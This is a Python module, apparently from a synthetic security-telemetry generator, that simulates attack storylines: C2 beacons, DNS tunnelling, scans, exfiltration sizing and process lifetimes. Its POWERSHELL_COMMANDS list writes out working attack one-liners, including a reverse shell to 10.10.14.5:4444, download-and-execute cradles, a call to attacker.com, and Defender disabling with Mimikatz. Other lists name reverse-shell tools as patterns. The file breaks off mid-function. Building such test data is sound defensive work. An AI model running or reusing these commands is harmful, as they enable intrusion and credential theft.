# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# SPDX-License-Identifier: MIT

"""Storyline event scheduling and execution methods.

Contains the StorylineMixin with methods for:
- Storyline event execution (single and batch)
- Typed event dispatch (logon, process, connection, etc.)
- Supplementary event emission
- Command-line output file extraction
- Encoded PowerShell generation
"""

import base64
import binascii
import itertools
import logging
import math
import random
import re
import shlex
from collections.abc import Iterable, Iterator, Sequence
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from types import SimpleNamespace
from typing import Any

from evidenceforge.generation.actions import (
    IdsAlertActionBundle,
    IdsAlertRequest,
    PortScanActionBundle,
    PortScanRequest,
    ScpReceiverFileActionBundle,
    ScpReceiverFileRequest,
    StagedArchiveSmbReadActionBundle,
    StagedArchiveSmbReadRequest,
    WebScanActionBundle,
    WebScanRequest,
)
from evidenceforge.generation.activity.application_catalog import resolve_image_path
from evidenceforge.generation.activity.dns_txt import choose_background_dns_txt_record
from evidenceforge.generation.activity.helpers import _get_os_category
from evidenceforge.generation.activity.http_content import (
    apply_transfer_size_variance,
    is_stable_resource_path,
    normalize_mime_type_for_path,
    response_size_for_mime,
    response_size_for_status,
)
from evidenceforge.generation.activity.network import _is_private_ip
from evidenceforge.models.scenario import System, User
from evidenceforge.utils.rng import _get_rng, _stable_seed, stable_uuid
from evidenceforge.utils.time import parse_duration, parse_iso8601

logger = logging.getLogger(__name__)

_MAX_EMBEDDED_COMMAND_B64_CHARS = 16_384
_IPV4_LITERAL_RE = re.compile(r"\d{1,3}(?:\.\d{1,3}){3}")
_NET_USER_ADD_WITH_PASSWORD_RE = re.compile(
    r"\bnet1?\s+user\s+(?P<username>\S+)\s+(?P<password>\S+)\s+/add\b",
    re.IGNORECASE,
)


def _is_exfil_connection_spec(spec: Any) -> bool:
    """Return True when a storyline connection describes exfiltration."""
    desc = (spec.description or "").lower()
    tech = (spec.technique or "").lower()
    return "exfil" in desc or "t1041" in tech or "t1048" in tech


def _is_c2_http_request(
    *,
    description: str | None,
    technique: str | None,
    uri: str | None,
    activity: str | None = None,
) -> bool:
    """Return True when a storyline HTTP request should look like C2/tasking."""
    uri_l = (uri or "").lower()
    text = f"{description or ''} {technique or ''} {activity or ''} {uri_l}".lower()
    text_markers = (
        "c2",
        "beacon",
        "callback",
        "checkin",
        "tasking",
        "command and control",
        "t1041",
        "t1071",
    )
    path_markers = (
        "/v2/",
        "/callback",
        "/checkin",
        "/beacon",
        "/task",
        "/cmd",
        "/gate",
    )
    return any(marker in text for marker in text_markers) or any(
        marker in uri_l for marker in path_markers
    )


def _c2_http_response_size(rng: random.Random, *, method: str, uri: str) -> int:
    """Return varied source-native response body sizes for C2-like HTTP requests."""
    method_u = method.upper()
    uri_l = uri.lower()
    if method_u == "POST":
        return rng.randint(160, 2600)
    if any(marker in uri_l for marker in ("/status", "/check", "/heartbeat", "/ping")):
        band = rng.choices(["ack", "config", "task"], weights=[55, 34, 11], k=1)[0]
        if band == "ack":
            return rng.randint(90, 1800)
        if band == "config":
            return rng.randint(2400, 14500)
        return rng.randint(18_000, 86_000)
    if any(marker in uri_l for marker in ("/client", "/stage", "/update", "/loader")):
        return rng.randint(8_000, 94_000)
    return rng.randint(220, 11_000)


def _is_round_transfer_size(value: int) -> bool:
    """Return True for large human-authored round byte counts."""
    if value < 1_000_000:
        return False
    binary_mib = 1024 * 1024
    decimal_mb = 1000 * 1000
    return value % binary_mib == 0 or value % decimal_mb == 0 or value & (value - 1) == 0


def _deround_storyline_transfer_size(value: int, rng) -> int:
    """Add archive/package variance so exfil sizes do not land on exact MB boundaries."""
    delta_min = max(32_768, value // 250)
    delta_max = max(delta_min + 1, value // 25)
    delta = rng.randint(delta_min, delta_max) + rng.randint(137, 8191)
    if value - delta > 1_000_000 and rng.random() < 0.35:
        adjusted = value - delta
    else:
        adjusted = value + delta
    if _is_round_transfer_size(adjusted):
        adjusted += rng.randint(139, 8191)
    return adjusted


def _size_storyline_connection(
    spec,
    rng,
) -> tuple[int, int]:
    """Determine orig_bytes/resp_bytes for a storyline connection.

    Priority:
    1. Explicit spec values (author override)
    2. Heuristic sizing based on technique/description keywords
    3. Default bidirectional range
    """
    ob = spec.orig_bytes
    rb = spec.resp_bytes

    desc = (spec.description or "").lower()
    tech = (spec.technique or "").lower()

    is_exfil = _is_exfil_connection_spec(spec)
    is_c2 = "c2" in desc or "callback" in desc or "beacon" in desc or "t1071" in tech
    is_download = "download" in desc or "stage" in desc or "t1105" in tech

    if ob is not None and is_exfil and _is_round_transfer_size(ob):
        ob = _deround_storyline_transfer_size(ob, rng)

    if ob is None:
        if is_exfil:
            ob = rng.randint(1_000_000, 50_000_000)  # 1-50 MB
        elif is_c2:
            ob = rng.randint(500, 5_000)
        elif is_download:
            ob = rng.randint(200, 2_000)
        else:
            ob = rng.randint(1_000, 10_000)

    if rb is None:
        if is_exfil:
            rb = rng.randint(200, 5_000)  # small ACK/response
        elif is_c2:
            rb = rng.randint(1_000, 10_000)  # tasking payload
        elif is_download:
            rb = rng.randint(50_000, 5_000_000)  # 50KB-5MB payload
        else:
            rb = rng.randint(5_000, 50_000)

    return ob, rb


def _iter_periodic_ticks(
    start_time: datetime,
    interval_sec: float,
    duration_sec: float | None,
    count: int | None,
    jitter: float,
    rng,
):
    """Yield timestamps for periodic bulk events.

    Shared timing engine for beacon, web_scan, credential_spray, dga_queries,
    dns_tunnel, and any future periodic event types.

    Args:
        start_time: First event timestamp.
        interval_sec: Seconds between events.
        duration_sec: Total campaign length in seconds (None when using count).
        count: Exact number of events to emit (None when using duration).
        jitter: Fraction of interval to randomize (0.0–1.0).
        rng: Random number generator instance.

    Yields:
        datetime for each tick.
    """
    t = 0.0
    emitted = 0
    end_time = start_time + timedelta(seconds=duration_sec) if duration_sec is not None else None
    last_tick = None
    while True:
        if duration_sec is not None and t > duration_sec:
            break
        if count is not None and emitted >= count:
            break
        jitter_offset = rng.uniform(-jitter * interval_sec, jitter * interval_sec)
        tick_time = start_time + timedelta(seconds=max(0.0, t + jitter_offset))
        # Clamp to window end (jitter can push past duration)
        if end_time is not None and tick_time > end_time:
            tick_time = end_time
        # Ensure monotonic ordering (jitter can cause inversions)
        if last_tick is not None and tick_time < last_tick:
            tick_time = last_tick + timedelta(milliseconds=1)
        last_tick = tick_time
        yield tick_time
        emitted += 1
        t += interval_sec


def _iter_dns_tunnel_ticks(
    start_time: datetime,
    interval_sec: float,
    duration_sec: float | None,
    count: int | None,
    jitter: float,
    rng,
):
    """Yield DNS tunnel timestamps with pauses, skips, and variable pacing."""
    end_time = start_time + timedelta(seconds=duration_sec) if duration_sec is not None else None
    pause_offset = 0.0
    for tick_index, tick_time in enumerate(
        _iter_periodic_ticks(start_time, interval_sec, duration_sec, count, jitter, rng)
    ):
        if tick_index > 0 and rng.random() < 0.045:
            pause_offset += rng.uniform(interval_sec * 4.0, interval_sec * 26.0)
        if tick_index > 0 and rng.random() < 0.055:
            continue
        local_spacing = rng.expovariate(1.0 / max(interval_sec * 0.55, 0.001))
        if tick_index > 0 and rng.random() < 0.11:
            local_spacing += rng.uniform(interval_sec * 1.4, interval_sec * 6.5)
        paced_time = tick_time + timedelta(seconds=pause_offset + local_spacing)
        if end_time is not None and paced_time > end_time:
            break
        yield paced_time


def _choose_dns_tunnel_campaign_ttl(
    ttl_choices: list[tuple[int, float]],
    rng: random.Random,
) -> int:
    """Choose the dominant response TTL for one DNS tunnel campaign."""
    values = [value for value, _weight in ttl_choices]
    weights = [weight for _value, weight in ttl_choices]
    return int(rng.choices(values, weights=weights, k=1)[0])


def _choose_dns_tunnel_response_ttl(
    ttl_choices: list[tuple[int, float]],
    campaign_ttl: int,
    rng: random.Random,
) -> float:
    """Pick a source-native DNS tunnel response TTL with campaign-level skew."""
    roll = rng.random()
    if roll < 0.55:
        return float(campaign_ttl)

    near_distance = max(2, min(15, campaign_ttl or 2))
    nearby_ttls = [
        value
        for value, _weight in ttl_choices
        if value != campaign_ttl and abs(value - campaign_ttl) <= near_distance
    ]
    if roll < 0.78 and nearby_ttls:
        return float(rng.choice(nearby_ttls))

    values = [value for value, _weight in ttl_choices]
    weights = [weight for _value, weight in ttl_choices]
    return float(rng.choices(values, weights=weights, k=1)[0])


def _choose_dns_tunnel_response_template(
    templates: list[str],
    primary_template: str,
    secondary_templates: list[str],
    rng: random.Random,
) -> str:
    """Choose a DNS tunnel response template with family-level stickiness."""
    roll = rng.random()
    if roll < 0.46:
        return primary_template
    if roll < 0.82 and secondary_templates:
        return rng.choice(secondary_templates)
    return rng.choice(templates)


def _render_dns_tunnel_response_template(
    template: str,
    *,
    token: str,
    query_count: int,
    ttl: float,
    rng: random.Random,
) -> str:
    """Render a DNS tunnel TXT answer template using deterministic local values."""
    edge_hint = f"{rng.choice(('a', 'b', 'c', 'd', 'e', 'n', 'x'))}{rng.randint(1, 99)}"
    replacements = {
        "{token}": token,
        "{seq}": str(query_count),
        "{seq_hex}": f"{query_count & 0xFFFF:x}",
        "{edge}": edge_hint,
        "{ttl}": str(int(ttl)),
    }
    rendered = template
    for placeholder, value in replacements.items():
        rendered = rendered.replace(placeholder, value)
    return rendered


def _effective_rate_interval(rate: float, count: int | None, rng) -> float:
    """Return interval for rate-based bulk events.

    Explicit count-based events stay exact. Duration/end-time based events treat
    rate as an average throughput and apply deterministic per-campaign drift so
    repeated scans with the same nominal rate do not produce identical counts.
    """
    if not math.isfinite(rate) or rate <= 0.0:
        raise ValueError(f"rate must be a positive finite number, got {rate!r}")
    effective_rate = rate
    if count is None:
        effective_rate *= rng.uniform(0.82, 1.18)
    return 1.0 / effective_rate


def _web_scan_connection_profile(rng, *, is_tls: bool = False) -> tuple[str, float, int, int]:
    """Return source-native connection outcome fields for one web-scan attempt."""
    conn_state = rng.choices(
        ["SF", "S0", "RSTO", "RSTR"],
        weights=[88, 4, 5, 3],
        k=1,
    )[0]
    if conn_state == "S0":
        return conn_state, rng.uniform(0.002, 0.08), rng.randint(44, 220), 0
    if conn_state in {"RSTO", "RSTR"}:
        return conn_state, rng.uniform(0.01, 0.3), rng.randint(80, 900), rng.randint(0, 400)
    if is_tls:
        if rng.random() < 0.72:
            duration = rng.uniform(0.8, 3.5)
        elif rng.random() < 0.92:
            duration = min(rng.lognormvariate(1.0, 0.75), 12.0)
        else:
            duration = rng.uniform(6.0, 18.0)
        return conn_state, duration, rng.randint(260, 2600), rng.randint(700, 12000)
    return conn_state, rng.uniform(0.01, 0.5), rng.randint(200, 2000), rng.randint(200, 5000)


_SCAN_PORT_SERVICES = {
    22: "ssh",
    53: "dns",
    80: "http",
    443: "ssl",
    445: "smb",
    3306: "mysql",
    3389: "rdp",
    5432: "postgresql",
    8080: "http",
}
_SCAN_SERVICE_ALIASES = {
    22: {"ssh", "sshd", "openssh"},
    53: {"dns", "bind", "named", "ad-ds"},
    80: {"http", "apache", "apache2", "nginx", "httpd", "iis", "gunicorn"},
    443: {"https", "ssl", "tls", "apache", "apache2", "nginx", "httpd", "iis"},
    445: {"smb", "samba", "lanmanserver", "ad-ds"},
    3306: {"mysql", "mariadb"},
    3389: {"rdp", "termservice", "terminal-services"},
    5432: {"postgres", "postgresql"},
    8080: {"http", "apache", "apache2", "nginx", "httpd", "gunicorn", "tomcat", "squid"},
}


def _inventory_token(value: str) -> str:
    """Normalize scenario inventory labels for lightweight matching."""
    return value.lower().replace(" ", "-").replace("_", "-")


def _scan_target_exposes_port(
    target_system: System | None,
    port: int,
    *,
    external: bool = False,
) -> bool:
    """Return whether target inventory suggests a scan should find an open port."""
    if target_system is None:
        return False
    if external and port not in {80, 443, 8080}:
        return False
    services = {_inventory_token(service) for service in target_system.services}
    roles = {_inventory_token(role) for role in target_system.roles}
    system_type = _inventory_token(target_system.type)
    if services & _SCAN_SERVICE_ALIASES.get(port, set()):
        return True
    if port in {80, 443, 8080} and roles & {"web-server", "app-server", "forward-proxy"}:
        return True
    if port == 445 and (system_type == "domain-controller" or "file-server" in roles):
        return True
    if port == 3306 and "database" in roles:
        return True
    if port == 53 and "dns-server" in roles:
        return True
    if port == 3389 and "windows" in target_system.os.lower() and not external:
        return True
    return False


def _iter_shuffled_port_scan_pairs(
    targets: Sequence[str],
    ports: Sequence[int],
    rng: random.Random,
) -> Iterator[tuple[str, int]]:
    """Yield each target/port probe once in deterministic pseudo-shuffled order.

    Port-scan scenarios can legitimately describe thousands of targets and
    thousands of ports. Building and shuffling the full Cartesian product would
    allocate one tuple per probe up front, so this uses an affine permutation of
    the flattened index space instead. Memory stays proportional to the already
    resolved target and port lists while preserving a randomized probe order.
    """
    target_count = len(targets)
    port_count = len(ports)
    total_pairs = target_count * port_count
    if total_pairs == 0:
        return

    offset = rng.randrange(total_pairs)
    step = 1
    if total_pairs > 1:
        step = rng.randrange(1, total_pairs)
        if math.gcd(step, total_pairs) != 1:
            for delta in range(1, 1025):
                candidate = (step + delta) % total_pairs or 1
                if math.gcd(candidate, total_pairs) == 1:
                    step = candidate
                    break
            else:
                step = 1

    for sequence_index in range(total_pairs):
        probe_index = (offset + sequence_index * step) % total_pairs
        target_index, port_index = divmod(probe_index, port_count)
        yield targets[target_index], ports[port_index]


def _port_scan_connection_profile(
    rng,
    *,
    port: int,
    target_system: System | None,
    external: bool,
    default_deny_state: str,
) -> tuple[bool, str | None, str, float, int, int]:
    """Return firewall/action and conn fields for one storyline port-scan probe."""
    if _scan_target_exposes_port(target_system, port, external=external) and rng.random() > 0.14:
        conn_state = rng.choices(["SF", "RSTO", "RSTR"], weights=[78, 12, 10], k=1)[0]
        service = _SCAN_PORT_SERVICES.get(port, "")
        if conn_state == "SF":
            return (
                False,
                conn_state,
                service,
                rng.uniform(0.04, 0.95),
                rng.randint(0, 160),
                rng.randint(0, 900),
            )
        return (
            False,
            conn_state,
            service,
            rng.uniform(0.01, 0.35),
            rng.randint(0, 120),
            rng.randint(0, 240),
        )

    if default_deny_state == "REJ":
        conn_state = rng.choices(["REJ", "S0"], weights=[72, 28], k=1)[0]
    else:
        conn_state = rng.choices(["S0", "REJ"], weights=[72, 28], k=1)[0]
    if conn_state == "S0":
        return True, conn_state, "", rng.uniform(1.2, 7.0), rng.randint(0, 64), 0
    return True, conn_state, "", rng.uniform(0.003, 0.2), rng.randint(0, 96), rng.randint(0, 80)


def _observed_web_scan_status(path_entry: dict[str, Any], rng) -> int:
    """Return one request's observed HTTP status with sparse scan-time drift."""
    status = int(path_entry.get("status", 404))
    if rng.random() >= 0.08:
        return status
    if status == 200:
        return rng.choices([301, 302, 403, 404, 500], weights=[24, 16, 18, 34, 8], k=1)[0]
    if status in {301, 302}:
        return rng.choice([200, 403, 404])
    if status == 403:
        return rng.choices([401, 404, 429, 500], weights=[18, 58, 18, 6], k=1)[0]
    if status == 404:
        return rng.choices([403, 429, 500], weights=[72, 20, 8], k=1)[0]
    return status


def _web_scan_uri_with_runtime_variation(uri: str, request_count: int, rng) -> str:
    """Return scanner URI with sparse per-request query noise."""
    if "?" in uri or rng.random() >= 0.24:
        return uri
    separator = "&" if "?" in uri else "?"
    if rng.random() < 0.34:
        param = rng.choice(("v", "_", "cache", "rnd"))
        value = rng.randbytes(rng.randint(2, 5)).hex()
    elif rng.random() < 0.68:
        param = rng.choice(("id", "page", "item", "debug"))
        value = str((request_count * rng.randint(3, 17) + rng.randint(1, 2009)) % 10000)
    else:
        param = rng.choice(("return", "next", "url"))
        value = rng.choice(("%2F", "%2Flogin", "%2Fadmin", "%2Findex.php"))
    return f"{uri}{separator}{param}={value}"


def _dns_tunnel_extra_labels(query_count: int, rng) -> list[str]:
    """Return optional DNS tunnel labels that make query grammar less uniform."""
    roll = rng.random()
    if roll < 0.34:
        return []
    edge = f"{rng.choice(('a', 'b', 'c', 'd', 'e', 'n', 'x', 'u'))}{rng.randint(1, 99)}"
    region = rng.choice(("iad", "ord", "dfw", "sjc", "lax", "atl", "ewr"))
    if roll < 0.54:
        return [edge]
    if roll < 0.72:
        return [rng.choice(("cdn", "api", "img", "edge", "r", region)), edge]
    if roll < 0.86:
        return [f"s{query_count & 0xFFFF:x}", rng.choice(("a", "b", "r", region))]
    if roll < 0.95:
        return [edge, f"r{rng.randint(1, 12)}", rng.choice(("cdn", "cache", "svc", region))]
    return [
        rng.choice(("api", "cdn", "assets", "edge")),
        region,
        f"n{rng.randint(1, 7)}",
    ]


def _dns_tunnel_background_txt_record(rng: random.Random) -> tuple[str, str, int]:
    """Return a benign TXT query/answer that can collide with tunnel-era DNS."""
    return choose_background_dns_txt_record(rng)


def _web_scan_path_allows_referrer(path_entry: dict[str, Any]) -> bool:
    """Return whether a scanner path plausibly carries a crawl Referer."""
    uri = str(path_entry.get("uri", ""))
    status = int(path_entry.get("status", 404))
    if path_entry.get("ids") or status >= 400:
        return False
    suspicious_prefixes = (
        "/.",
        "/admin",
        "/wp-",
        "/phpmyadmin",
        "/server-status",
        "/cgi-bin",
    )
    return not uri.lower().startswith(suspicious_prefixes)


def _normalize_storyline_process_image(
    process_name: str,
    os_category: str,
    username: str = "",
) -> str:
    """Normalize a storyline executable to the canonical full path when possible."""
    if "\\" in process_name or "/" in process_name:
        return process_name
    return resolve_image_path(process_name, os_category, username=username)


def _linux_shell_process_command_line(process_name: str, command_line: str) -> str | None:
    """Return an explicit shell invocation for Linux shell process specs."""
    exe = process_name.rsplit("/", 1)[-1].lower()
    if exe not in {"bash", "dash", "sh", "zsh"}:
        return None
    try:
        parts = shlex.split(command_line, comments=False, posix=True)
    except ValueError:
        parts = command_line.split()
    if not parts:
        return f"{exe} -c ''"
    first = parts[0].rsplit("/", 1)[-1].lower()
    if first == exe:
        return command_line
    return f"{exe} -c {shlex.quote(command_line)}"


# Realistic decoded PowerShell commands for base64 encoding
POWERSHELL_COMMANDS = [
    "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
    "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
    "Invoke-Expression (Invoke-WebRequest -Uri 'http://10.10.14.5:8080/shell.ps1' -UseBasicParsing).Content",
    "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
    "Set-MpPreference -DisableRealtimeMonitoring $true; Import-Module C:\\Users\\Public\\mimikatz.ps1; Invoke-Mimikatz -DumpCreds",
    "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$c=[Microsoft.VisualBasic.Interaction]::CallByName([type]'SEBr'+'owse','Nav' + 'igate',[Microsoft.VisualBasic.CallType]::Method,@('http://attacker.com/stage2'))",
    "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\Public\\data.zip','C:\\Users\\Public\\exfil')",
    "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\Users\\Public\\staging",
    "Invoke-Command -ComputerName DC-01 -ScriptBlock { Get-ADUser -Filter * -Properties * | Export-Csv C:\\temp\\users.csv }",
    "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell.exe -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1'",
]

# ── Story process lifetime estimation ──────────────────────────────────
# Returns (min_seconds, max_seconds) or None for long-running (no termination).

_SHORT_COMMANDS: set[str] = {
    # Windows recon
    "whoami",
    "whoami.exe",
    "ipconfig",
    "ipconfig.exe",
    "hostname",
    "hostname.exe",
    "systeminfo",
    "systeminfo.exe",
    "tasklist",
    "tasklist.exe",
    "nltest",
    "nltest.exe",
    "dir",
    "type",
    "findstr",
    "findstr.exe",
    "reg",
    "reg.exe",
    "net.exe",
    "net1.exe",
    "net",
    "net1",
    "query",
    "klist",
    "klist.exe",
    "nslookup",
    "nslookup.exe",
    "netstat",
    "netstat.exe",
    "arp",
    "arp.exe",
    "route",
    "route.exe",
    "qwinsta",
    "qwinsta.exe",
    "dsquery",
    "dsquery.exe",
    # Linux recon
    "id",
    "uname",
    "ifconfig",
    "cat",
    "ls",
    "ps",
    "ss",
    "find",
    "grep",
    "awk",
    "head",
    "tail",
    "wc",
    "env",
    "printenv",
    "df",
    "mount",
    "w",
    "last",
    "ip",
    "hostnamectl",
}

_MEDIUM_COMMANDS: set[str] = {
    "powershell.exe",
    "powershell",
    "pwsh",
    "certutil",
    "certutil.exe",
    "bitsadmin",
    "bitsadmin.exe",
    "wmic",
    "wmic.exe",
    "schtasks",
    "schtasks.exe",
    "sc",
    "sc.exe",
    "mshta",
    "mshta.exe",
    "cscript",
    "cscript.exe",
    "wscript",
    "wscript.exe",
    "rundll32",
    "rundll32.exe",
    "cmd.exe",
    "cmd",  # cmd itself is medium; the inner command may be short
    "msbuild",
    "msbuild.exe",
    "regsvr32",
    "regsvr32.exe",
    # Linux attack tools
    "curl",
    "wget",
    "python",
    "python3",
    "perl",
    "ruby",
    "mysqldump",
    "pg_dump",
    "tar",
    "gzip",
    "zip",
    "scp",
}

# Patterns in command_line that indicate long-running / persistent processes
_LONG_RUNNING_PATTERNS: list[str] = [
    "TCPClient",
    "TCPListener",
    "$s.Read",
    "ncat",
    "socat",
    "nc -l",
    "nc.exe -l",
    "meterpreter",
    "beacon",
    "reverse_tcp",
    "bind_tcp",
    "-persist",
    "--keep-alive",
    "while(true)",
    "while True",
    "Start-Sleep -Seconds 99",
    "tail -f",
]

_LONG_RUNNING_EXES: set[str] = {
    "mstsc.exe",
    "mstsc",
    "rdpclip.exe",
    "rdpclip",
    "healthmonitorsvc.exe",
    "ncat",
    "ncat.exe",
    "nc",
    "nc.exe",
    "socat",
}


def _estimate_process_lifetime(process_name: str, command_line: str) -> tuple[float, float] | None:
    """Estimate how long a story process should run before terminating.

    Returns (min_seconds, max_seconds) for the termination delay,
    or None if the process should be left running (long-lived/persistent).
    """
    # Extract bare executable name
    if "\\" in process_name:
        exe = process_name.rsplit("\\", 1)[-1].lower()
    elif "/" in process_name:
        exe = process_name.rsplit("/", 1)[-1].lower()
    else:
        exe = process_name.lower()

    if exe == "psexesvc.exe":
        return (8.0, 45.0)

    # Check long-running first
    if exe in _LONG_RUNNING_EXES:
        return None
    cl_lower = command_line.lower()
    for pattern in _LONG_RUNNING_PATTERNS:
        if pattern.lower() in cl_lower:
            return None

    # For cmd.exe /c, classify based on the inner command
    if exe in ("cmd.exe", "cmd") and "/c " in cl_lower:
        inner = cl_lower.split("/c ", 1)[1].strip()
        inner_exe = inner.split()[0] if inner else ""
        # Strip path from inner exe
        if "\\" in inner_exe:
            inner_exe = inner_exe.rsplit("\\", 1)[-1]
        elif "/" in inner_exe:
            inner_exe = inner_exe.rsplit("/", 1)[-1]
        if inner_exe in _SHORT_COMMANDS:
            return (0.3, 3.0)
        if inner_exe in _MEDIUM_COMMANDS:
            return (3.0, 20.0)

    if exe in _SHORT_COMMANDS:
        return (0.3, 5.0)
    if exe in _MEDIUM_COMMANDS:
        return (5.0, 30.0)

    # Default: medium-lived unknown command
    return (2.0, 15.0)


def _extract_schtasks_option(command_line: str, option: str) -> str:
    """Extract a quoted or bare schtasks.exe option value."""
    if not command_line:
        return ""
    option_name = option.lstrip("/")
    match = re.search(
        rf'(?:^|\s)/{re.escape(option_name)}\s+(?:"(?P<quoted>[^"]*)"|(?P<bare>\S+))',
        command_line,
        flags=re.IGNORECASE,
    )
    if match is None:
        return ""
    return (match.group("quoted") or match.group("bare") or "").strip()


def _extract_sc_create_service_start_type(command_line: str) -> tuple[str, str] | None:
    """Extract service name and native start type from an sc.exe create command."""
    if not command_line:
        return None
    match = re.search(
        r'\bsc(?:\.exe)?\s+create\s+(\S+)\s+binpath=\s*"?([^"]+)"?',
        command_line,
        flags=re.IGNORECASE,
    )
    if match is None:
        return None
    service_name = match.group(1)
    service_start_type = "3"
    start_match = re.search(
        r"\bstart=\s*(delayed-auto|auto|demand|disabled|boot|system)\b",
        command_line,
        flags=re.IGNORECASE,
    )
    if start_match is not None:
        service_start_type = {
            "boot": "0",
            "system": "1",
            "auto": "2",
            "delayed-auto": "2",
            "demand": "3",
            "disabled": "4",
        }[start_match.group(1).lower()]
    return service_name, service_start_type


class StorylineMixin:
    """Mixin providing storyline event scheduling and execution methods."""

    def _ensure_account_sid_tracking(self) -> None:
        """Initialize the account SID tracking dict if not already present."""
        if not hasattr(self, "_created_account_sids"):
            self._created_account_sids: dict[str, str] = {}
        if not hasattr(self, "_created_account_effect_times"):
            self._created_account_effect_times: dict[tuple[str, str], datetime] = {}
        if not hasattr(self, "_storyline_host_available_at"):
            self._storyline_host_available_at: dict[tuple[str, str], datetime] = {}

    def _record_last_storyline_process(self, system: System, pid: int, image: str) -> None:
        """Record the last storyline process by host for later network provenance."""
        if not hasattr(self, "_last_storyline_process_by_system"):
            self._last_storyline_process_by_system: dict[str, tuple[int, str]] = {}
        self._last_storyline_process_by_system[system.hostname] = (pid, image)
        self._last_storyline_pid = pid
        self._last_storyline_image = image
        self._last_storyline_system = system.hostname

    def _record_storyline_service_install(
        self,
        system: System,
        service_name: str,
        service_file_name: str,
        service_account: str,
        time: datetime,
    ) -> None:
        """Remember installed storyline services for later service-backed beacons."""
        if not service_file_name:
            return
        if not hasattr(self, "_last_storyline_service_by_system"):
            self._last_storyline_service_by_system: dict[str, dict[str, Any]] = {}
        self._last_storyline_service_by_system[system.hostname] = {
            "service_name": service_name,
            "service_file_name": service_file_name,
            "service_account": service_account,
            "installed_at": time,
        }

    @staticmethod
    def _normalize_storyline_service_file_name(service_file_name: str) -> str:
        """Return a Windows service image path in source-native expanded form."""
        image = service_file_name.strip().strip('"')
        replacements = {
            "%SystemRoot%": r"C:\Windows",
            "%systemroot%": r"C:\Windows",
            r"\SystemRoot": r"C:\Windows",
        }
        for marker, replacement in replacements.items():
            if image.startswith(marker):
                image = replacement + image[len(marker) :]
                break
        return image.replace("/", "\\")

    @staticmethod
    def _service_account_user(service_account: str) -> User | None:
        """Return a User model for service identities that can own process telemetry."""
        normalized = service_account.strip().replace("/", "\\")
        account_key = normalized.upper()
        if account_key in {"LOCALSYSTEM", "LOCAL SYSTEM", "NT AUTHORITY\\SYSTEM", "SYSTEM"}:
            return User(
                username="SYSTEM",
                full_name="Local System",
                email="system@example.local",
            )
        return None

    def _storyline_service_context_for_process(
        self,
        actor: User,
        system: System,
        time: datetime,
        process_name: str,
    ) -> tuple[User, str, int] | None:
        """Return service identity/logon/parent PID for recent service-backed commands."""
        if _get_os_category(system.os) != "windows":
            return None
        services = getattr(self, "_last_storyline_service_by_system", {})
        service = services.get(system.hostname)
        if not service:
            return None

        service_file_name = str(service.get("service_file_name") or "")
        if not service_file_name:
            return None
        service_image = self._normalize_storyline_service_file_name(service_file_name)
        service_exe = service_image.rsplit("\\", 1)[-1].lower()
        if service_exe not in {"psexesvc.exe", "healthmonitorsvc.exe"}:
            return None
        installed_at = service.get("installed_at")
        if isinstance(installed_at, datetime):
            context_window = (
                timedelta(minutes=2) if service_exe == "psexesvc.exe" else timedelta(minutes=30)
            )
            if time < installed_at or time - installed_at > context_window:
                return None

        process_exe = process_name.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
        if process_exe == service_exe:
            return None
        service_child_exes = {
            "cmd.exe",
            "powershell.exe",
            "pwsh.exe",
            "net.exe",
            "net1.exe",
            "whoami.exe",
            "hostname.exe",
            "ipconfig.exe",
            "nltest.exe",
            "klist.exe",
            "sc.exe",
            "wevtutil.exe",
            "wmic.exe",
            "certutil.exe",
        }
        if process_exe not in service_child_exes:
            return None

        service_user = self._service_account_user(str(service.get("service_account") or ""))
        if service_user is None:
            return None

        service_pid, _service_image = self._ensure_storyline_service_process_for_beacon(
            actor=service_user,
            system=system,
            time=time,
        )
        if service_pid <= 0:
            return None
        return service_user, "0x3e7", service_pid

    def _linux_native_service_user_for_storyline_actor(
        self,
        actor: User,
        system: System,
        time: datetime,
    ) -> User:
        """Return the OS-native Linux service user for web-service storyline actors."""
        if _get_os_category(system.os) != "linux":
            return actor
        if actor.username.lower() not in {"apache", "www-data", "nginx", "httpd", "tomcat"}:
            return actor

        raw_system_pids = getattr(self.activity_generator, "_system_pids", {})
        if not isinstance(raw_system_pids, dict):
            return actor
        system_pids = raw_system_pids.get(
            system.hostname,
            {},
